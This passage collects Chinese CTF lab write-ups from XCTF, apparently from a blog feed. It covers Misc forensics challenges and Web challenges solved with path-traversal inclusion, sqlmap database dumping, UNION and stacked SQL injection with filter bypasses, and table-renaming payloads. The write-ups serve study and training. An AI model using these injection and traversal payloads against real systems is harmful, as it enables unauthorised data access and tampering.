title="Hear-with-your-Eyes"></a>Hear-with-your-Eyes</h2><p>（1）下载附件，一个.gz文件，解压后是一个没有后缀名的文件，用notepad++打开，没有flag信息。直接用7-zip工具打开，发现了一个sound.wav音频文件。<br><img src="https://img-blog.csdnimg.cn/20201104193005337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（2）根据提示“用眼睛看这段音频”，使用audacity工具打开这个wav文件，点击“sound”切换到频谱图，就能看到flag。<br>audacity官网下载地址：<a href="https://www.audacityteam.org/">https://www.audacityteam.org/</a><br><img src="https://img-blog.csdnimg.cn/20201104194048622.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="Ditf"><a href="#Ditf" class="headerlink" title="Ditf"></a>Ditf</h2><p>（1）下载得到一张png图片，notepad++打开，没发现啥信息，修改下图片高度看看。<br><img src="https://img-blog.csdnimg.cn/20201105114640452.png#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201105120341660.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（2）发现一串字符StRe1izia，应该是一个密码，将图片放到kali下用foremost分解，得到一个压缩包，解压需要密码，输入该串字符，成功解压。</p><p><img src="https://img-blog.csdnimg.cn/20201105120813523.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>。<br>（3）解压后得到一个Ditf.pcapng文件，用wireshark打开。Ctrl+F，选择字符串，搜索flag，无果。再搜索png，发现一个kiss.png。<br><img src="https://img-blog.csdnimg.cn/20201105123523762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（4）追踪http流，发现一串特征明显的代码<br><img src="https://img-blog.csdnimg.cn/202011051236377.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（5）用base64解码，得到flag。<br><img src="https://img-blog.csdnimg.cn/20201105123710874.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="神奇的Modbus"><a href="#神奇的Modbus" class="headerlink" title="神奇的Modbus"></a>神奇的Modbus</h2><p>（1）用wireshark打开附件，根据题意，输入modbus过滤，并追踪tcp流，可发现flag。<br><img src="https://img-blog.csdnimg.cn/20201107144903770.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/2020110714492428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（2）提交flag时注意题目格式为sctf{xxx}，但提交sctf{Easy_Mdbus}错误，仔细观察，根据题目，应提交sctf{Easy_Modbus}，多加一个o</p><h2 id="glance-50"><a href="#glance-50" class="headerlink" title="glance-50"></a>glance-50</h2><p>（1）附件是一张长条状的gif动图，很有可能就是分离gif的每一帧然后拼接形成图片得到flag。<br><img src="https://img-blog.csdnimg.cn/20201108120310683.png#pic_center" alt="在这里插入图片描述"></p><p>（2）将该图片放到kali里，用convert命令可以分解GIF图片</p><pre><code>convert 9266eadf353d4ada94ededaeb96d0c50.gif flag.png</code></pre><p><img src="https://img-blog.csdnimg.cn/20201108121130666.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201108120605449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（3）用convert分解出了200张图片，接下来就是图片的拼接。依旧使用kali下的工具montage。</p><pre><code>montage flag*.png -tile x1 -geometry +0+0 flag.png//-tile是拼接时每行和每列的图片数，这里用x1，就是只一行//-geometry是首选每个图和边框尺寸，边框为0，图照原始尺寸即可</code></pre><p><img src="https://img-blog.csdnimg.cn/20201108121230526.png#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201108121308124.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（4）flag为TWCTF{Bliss by Charles O’Rear}</p><h2 id="What-is-this"><a href="#What-is-this" class="headerlink" title="What-is-this"></a>What-is-this</h2><p>（1）得到一个.gz的压缩包，直接用7-zip工具打开，附件进行了两次压缩，最后得到两张类似的图片<br><img src="https://img-blog.csdnimg.cn/20201112194655132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20201112194718517.png#pic_center" alt="在这里插入图片描述"></p><p>（2）用stegsolve工具将两张图片合成一下，得到flag<br><img src="https://img-blog.csdnimg.cn/20201112194751259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="再见李华"><a href="#再见李华" class="headerlink" title="再见李华"></a>再见李华</h2><p>（1）下载附件得到一张图片，图上是md5的信息，但解密不出来。放到kali中binwalk一下，发现还有一个压缩包。用foremost分离文件，得到压缩包，但解压需要密码。<br><img src="https://img-blog.csdnimg.cn/20201114112042304.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）根据题目提示，1000个字，署名，LiHua<br>猜测1000个字是4位，LiHua是密码的一部分，将这两个部分组合起来，用ARCHPR进行爆破<br><img src="https://img-blog.csdnimg.cn/20201114112209518.png#pic_center" alt="在这里插入图片描述"><br>（3）爆破时攻击类型选择“掩码”，并设置掩码“????LiHua”<br><img src="https://img-blog.csdnimg.cn/20201114112817329.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（4）成功破解，得到密码15CCLiHua，解压后得到flag<br><img src="https://img-blog.csdnimg.cn/20201114112938259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> XCTF_Misc进阶区 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF_Web_005</title>
      <link href="2020/11/15/XCTF/XCTF_Web-005/"/>
      <url>2020/11/15/XCTF/XCTF_Web-005/</url>
      
        <content type="html"><![CDATA[<h2 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a>NaNNaNNaNNaN-Batman</h2><p>（1）下载附件，是一个没有后缀名的文件，用notepad++打开<br><img src="https://img-blog.csdnimg.cn/20201104203101152.png#pic_center" alt="在这里插入图片描述">（2）很多乱码，但从&lt;script&gt;中可以看出是这是一段js代码，需要用浏览器打开。将文件后缀名改为.html，点击打开。<br><img src="https://img-blog.csdnimg.cn/20201104203445934.png#pic_center" alt="在这里插入图片描述">（3）有一个输入框，但是输什么都没有反应。查看网页源代码，发现源代码里有乱码。<br><img src="https://img-blog.csdnimg.cn/20201104203642634.png#pic_center" alt="在这里插入图片描述"></p><p>(4）出现乱码是因为 html 无法识别某些编码，在“eval”前添加一句“alert(_);”。重新用浏览器打开，即显示出正常代码。<br><img src="https://img-blog.csdnimg.cn/20201104210527470.png#pic_center" alt="在这里插入图片描述">（5）使用在线网站将这段js代码对齐 <a href="https://beautifier.io/">https://beautifier.io/</a><br><img src="https://img-blog.csdnimg.cn/20201104211100387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（6）可以看到需要满足几个 if 中的正则表达式条件，^表示开始，$表示结尾，同时还要满足长度为16位。<br>把匹配出来的值be0f233ac7be98aa，输入到网页中的输入框就得到了flag。<br><img src="https://img-blog.csdnimg.cn/20201104212001550.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201104212019299.png#pic_center" alt="在这里插入图片描述"></p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>（1）打开网址，根据注释中的提示，逆向加密算法，解密$miwen就能得到flag<br><img src="https://img-blog.csdnimg.cn/20201114164452564.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）分析其中的PHP内置函数</p><pre><code>strrev(string): 反转字符串strlen(string): 返回字符串的长度substr(string, start, length): 返回字符串的一部分   //string: 所需要的字符串//start: 在字符串何处开始//length: 可选。规定被返回字符串的长度。默认是直到字符串的结尾ord(string): 返回字符串首个字符的 ASCII 值chr(): 从指定的 ASCII 值返回对应的字符str_rot13(string): 对字符串执行 ROT13 编码。//ROT13 编码把每一个字母在字母表中向前移动 13 个字母。数字和非字母字符保持不变base64_encode(string): 使用 MIME base64 对数据进行编码</code></pre><p>(3)分析网址中的函数</p><pre><code>&lt;?php$miwen=&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;function encode($str)&#123;                //给encode一个参数 $str    $_o=strrev($str);                 //将所传参数 $str 通过 strrev() 函数反转字符串操作并赋值给 $_o    // echo $_o;    for($_0=0;$_0&lt;strlen($_o);$_0++)&#123;          //循环遍历 变量 $_o        $_c=substr($_o,$_0,1);    //在for循环中首先依次取字符串 $_o 的第 $_0 个值，赋值给 $_c        $__=ord($_c)+1;  //将变量 $c 转化为 ASCII码 并 +1，赋值给 $_        $_c=chr($__);   //将 $__ 转化为该ASCII码所对应的字符，赋值给 $_c        $_=$_.$_c;     //拼接字符串，赋值给$_    &#125;     return str_rot13(strrev(base64_encode($_)));      //将拼接好后的字符串 $_ 先进行 base64编码，再将编码后的值进行反转字符串操作，    //最后对反转后的字符串进行 rot13 加密，得出结果为$miwen&#125;highlight_file(__FILE__);/*   逆向加密算法，解密$miwen就是flag*/?&gt;</code></pre><p>（4）用在线工具写出逆向代码 <a href="https://tool.lu/coderunner/">https://tool.lu/coderunner/</a></p><pre><code>&lt;?php$str=&#39;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&#39;;$_ = base64_decode(strrev(str_rot13($str)));$_o=NULL;for($_0=0;$_0&lt;strlen($_);$_0++)&#123;          $_c=substr($_,$_0,1);          $__=ord($_c)-1;          $_c=chr($__);          $_o=$_o.$_c;       &#125; echo strrev($_o);?&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> XCTF_Web进阶区 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF_Web_004</title>
      <link href="2020/11/15/XCTF/XCTF_Web-004/"/>
      <url>2020/11/15/XCTF/XCTF_Web-004/</url>
      
        <content type="html"><![CDATA[<h2 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h2><p><img src="https://img-blog.csdnimg.cn/20201031154407968.png#pic_center" alt="在这里插入图片描述"><br>（1）打开网址，根据题意点击报表中心（试了一下点击其他的发现都一样）<br><img src="https://img-blog.csdnimg.cn/20201031154600915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）发现URL栏有?id=1，使用burp爆破id。<br>（3）设置浏览器的配置为手动代理配置，burp设置为拦截请求，刷新页面<br><img src="https://img-blog.csdnimg.cn/20201031155001664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（4）发送给Inturder，设置爆破点为id变量<br><img src="https://img-blog.csdnimg.cn/20201031155237191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（5）把爆破变量设为数值<br><img src="https://img-blog.csdnimg.cn/20201031155404737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（6）为了让爆破更快，这里设置多一点线程<br><img src="https://img-blog.csdnimg.cn/20201031155516421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（7）开始攻击，发现id为2333时长度和其他数值不一样（这里不要一个一个找，点击“长”，英文版是“length”会排序）<br><img src="https://img-blog.csdnimg.cn/20201031155630573.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（8）回到网址，把id改为2333，发现flag<br><img src="https://img-blog.csdnimg.cn/20201031155907909.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>（1）打开网址，是一张滑稽图片，查看网页源代码，发现source.php<br><img src="https://img-blog.csdnimg.cn/20201101152117873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（2）进一步访问，又发现一个hint.php<br><img src="https://img-blog.csdnimg.cn/20201101152358875.png#pic_center" alt="在这里插入图片描述"></p><p>（3）这里提示了flag在这个ffffllllaaaagggg文件中<br>（4）返回source.php，继续审计代码<br><img src="https://img-blog.csdnimg.cn/20201101153340968.png#pic_center" alt="在这里插入图片描述"></p><p>（5）参数file满足三个条件，就会包含文件，file可以由自己构造。<br>条件一：检查file变量是否为空。<br>条件二：检查file变量是否为字符串。<br>条件三：通过checkFile函数来检查<br>（6）由于要构造payload，条件一和二直接满足，直接查看checkFile函数代码：<br><img src="https://img-blog.csdnimg.cn/20201101154211432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（7）发现包含四个if语句：<br>第一个 if 语句对变量进行检验，要求$page为字符串，否则返回 false；<br>第二个 if 语句判断$page是否存在于$whitelist数组中，存在则返回 true;<br>第三个 if 语句，截取传进参数中首次出现?之前的部分，判断该部分是否存在于$whitelist数组中，存在则返回 true;<br>第四个 if 语句，先对构造的 payload 进行 url 解码，再截取传进参数中首次出现?之前的部分，并判断该部分是否存在于$whitelist中，存在则返回 true;</p><p>#以上4个if语句，满足一个即可返回true。都未满足则返回false。<br>（8）这里用第三个if语句构造参数：</p><pre><code>?file=source.php?/../../../../ffffllllaaaagggg</code></pre><p>第一个?用来传参，第二个?用来满足截取<br><img src="https://img-blog.csdnimg.cn/20201101155834665.png#pic_center" alt="在这里插入图片描述"></p><p>（9）include<br><img src="https://img-blog.csdnimg.cn/20201101160319289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">#因为参数有定义路径，就会忽略/前的字符串，直接去找/../../../../ffffllllaaaagggg这个文件。</p><h2 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h2><p><img src="https://img-blog.csdnimg.cn/20201102190517255.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">解法一：<br>（1）打开网址，如上图所示页面。考虑到xss或sql注入，试试sql注入。随便输入123后，使用burp抓包</p><p><img src="https://img-blog.csdnimg.cn/20201102190831493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>（2）发现是post方式，直接sqlmap爆破。将这些保存在一个文本文档里，为了方便命名为1.txt。并将该文本放到sqlmap所在目录下。使用命令爆破数据库</p><pre><code>sqlmap.py -r 1.txt --dbs</code></pre><p><img src="https://img-blog.csdnimg.cn/20201102191110973.png#pic_center" alt="在这里插入图片描述"></p><p>（3）看到一个news，继续使用命令查看news数据库的内容</p><pre><code>sqlmap.py -r 1.txt -D news --dump</code></pre><p><img src="https://img-blog.csdnimg.cn/20201102191335386.png#pic_center" alt="在这里插入图片描述"></p><p>（4）发现flag</p><p>解法二：<br>（1）尝试构造语句sr’ or ‘1=1，果然返回了7条新闻。通常使用单引号，1,2等尝试，然后用union联合查询获取信息。union就是两个结果的去重合集，但前提要列数一致。因此构造语句判断数据的列数。</p><pre><code>sr&#39; union select 1,2#</code></pre><p>（2）没有正确返回结果，再试试：</p><pre><code>sr&#39; union select 1,2,3#//语句中的第一个单引号&#39;用来闭合后台的第一个&#39;，前面的sr也可改成其他字符或数字//语句中的#用来注释掉后台的第二个&#39;</code></pre><p><img src="https://img-blog.csdnimg.cn/20201102194027695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（3）只有1,2,3的时候才正确返回，因此数据的列数为3列。<br>（4）接下来利用information_schema来获得所有的表名，构造语句：</p><pre><code>sr&#39; union select 1,2,table_name from information_schema.tables#//前面的1，2就是凑列数的</code></pre><p>（5）得到一大串的表名，慢慢找，发现最底下有news和secret_table数据库<br><img src="https://img-blog.csdnimg.cn/20201102195426161.png#pic_center" alt="在这里插入图片描述"></p><p>（6）因为试过了news，没有结果。接下来利用information_schema.columns的结构来获得secret表的信息。我们要得到的信息也就只有列名column_name，也可以再加上column_type来查看数据类型。附上大佬的文章<a href="https://www.cnblogs.com/JiangLe/p/5793555.html">https://www.cnblogs.com/JiangLe/p/5793555.html</a>因此，构造</p><pre><code>sr&#39; union select 1,column_type,column_name from information_schema.columns where table_name=&#39;secret_table&#39;#</code></pre><p><img src="https://img-blog.csdnimg.cn/20201102200351773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">（7）看到了flag的信息，构造语句：</p><pre><code>sr&#39; union select 1,2,fl4g from secret_table#</code></pre><p><img src="https://img-blog.csdnimg.cn/20201102201007827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> XCTF_Web进阶区 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF_Web_003</title>
      <link href="2020/11/15/XCTF/XCTF_Web-003/"/>
      <url>2020/11/15/XCTF/XCTF_Web-003/</url>
      
        <content type="html"><![CDATA[<h2 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h2><p>这里使用谷歌浏览器<br>拿到题目后，发现是单引号报错字符型注入<br><img src="https://img-blog.csdnimg.cn/20201030213318460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>用order by语句判断出两个字段：order by 2的时候页面正常回显，order by 3的时候页面出错。<br>使用union select联合查询，发现关键字select被正则过滤了<br><img src="https://img-blog.csdnimg.cn/20201030215019329.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>因此，需要绕过select的过滤<br>解法一：<br>（1）堆叠注入/?inject=-1’;show tables –+<br><img src="https://img-blog.csdnimg.cn/20201030215208646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>(2)发现了两张表，分别查询两张表中的字段，<br>/?inject=-1’;show columns from <code>1919810931114514</code> –+<br><img src="https://img-blog.csdnimg.cn/20201030215234255.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>/?inject=-1’;show columns from <code>words</code> –+<br><img src="https://img-blog.csdnimg.cn/20201030215807801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>(3)发现了flag在第一个表中，接下来就是要查看flag的内容了。但是select被过滤了，这里可以采用预编译的方式绕过。</p><pre><code>?inject=-1&#39;;set @sql = CONCAT(&#39;sele&#39;,&#39;ct * from \`1919810931114514\`;&#39;);prepare aaa from @sql;EXECUTE aaa;#</code></pre><p><img src="https://img-blog.csdnimg.cn/2020103021590551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（4）这里用strstr函数过滤了’set’和’prepare’关键词，利用strstr不能区分大小写，将其改为大写即可</p><pre><code>/?inject=-1&#39;;sEt @sql = CONCAT(&#39;sele&#39;,&#39;ct * from \`1919810931114514\`;&#39;);prepArE aaa from @sql;EXECUTE aaa;#</code></pre><p>或者</p><pre><code>/?inject=-1&#39;;sEt @sql = CONCAT(&#39;se&#39;,&#39;lect * from \`1919810931114514\`;&#39;);prEpare stmt from @sql;EXECUTE stmt;#</code></pre><p>或者</p><pre><code>/?inject=-1&#39;;use supersqli;set @sql=concat(&#39;s&#39;,&#39;elect * from \`1919810931114514\`&#39;);PREPARE pre FROM @sql;EXECUTE pre;--+</code></pre><p><img src="https://img-blog.csdnimg.cn/20201030220213454.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>解法二：<br>handler查询<br>在查找到有两张表的前提下进行<br>（1）使用方法：<br>handler table_name open打开一张表<br>handel table_name read first读取第一行内容，<br>handel table_name read next依次获取其它行</p><pre><code>/?inject=-1&#39;;handler `1919810931114514` open;handler `1919810931114514` read first;#</code></pre><p><img src="https://img-blog.csdnimg.cn/20201030220325455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>解法三：<br>（1）修改表名和列名，在查找到两个表后，看一下第二个表<br><img src="https://img-blog.csdnimg.cn/20201030220350522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）其中有一个列就是data列，是可以进行查询的。所以这里将表1919810931114514名字改为words，flag列名字改为id，就可以查询flag的内容了。</p><pre><code>1&#39;; alter table words rename to aaaa;alter table `1919810931114514` rename to words;alter table words change flag id varchar(100);#</code></pre><p>其中：<br>alter table words rename to aaaa;先把原来的words表名字改成别的，这个随便<br>alter table`1919810931114514` rename to words;将表1919810931114514的名字改为words<br>alter table words change flag id varchar(100);将改完名字后的表中的flag改为id，字符串尽量长点<br>（3）然后用1’ or 1=1 –+直接就能得到正确结果<br><img src="https://img-blog.csdnimg.cn/20201030220617899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> XCTF_Web进阶区 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF_Web_002</title>
      <link href="2020/11/15/XCTF/XCTF_Web-002/"/>
      <url>2020/11/15/XCTF/XCTF_Web-002/</url>
      
